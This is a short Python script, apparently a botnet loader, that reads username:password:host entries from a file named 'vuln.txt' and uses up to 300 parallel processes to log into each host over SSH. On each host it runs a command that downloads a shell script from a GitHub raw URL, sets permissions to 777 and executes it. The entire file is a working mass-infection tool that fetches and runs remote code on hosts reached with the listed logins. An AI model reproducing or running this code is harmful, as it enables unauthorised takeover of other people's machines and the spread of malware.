import paramiko
from concurrent.futures import ProcessPoolExecutor
import time

def process_host(credentials):
    username, password, host = credentials
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        ssh.connect(hostname=host, username=username, password=password)
        print(f"Connected to --> {host}")

        stdin, stdout, stderr = ssh.exec_command('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/skfnw.sh; chmod 777 *; sh skfnw.sh')

        time.sleep(10)

        ssh.close()

        print(f"Command Sent To --> {host}")

    except paramiko.AuthenticationException:
        print(f"Can't Authenticate Host {host}")
    except Exception as e:
        print(f"Can't Connect To Host {host}: {str(e)}")

if __name__ == "__main__":
    with open('vuln.txt', 'r') as file:
        lines = file.readlines()

    credentials_list = [line.strip().split(':') for line in lines]

    with ProcessPoolExecutor(max_workers=300) as executor:
        executor.map(process_host, credentials_list)
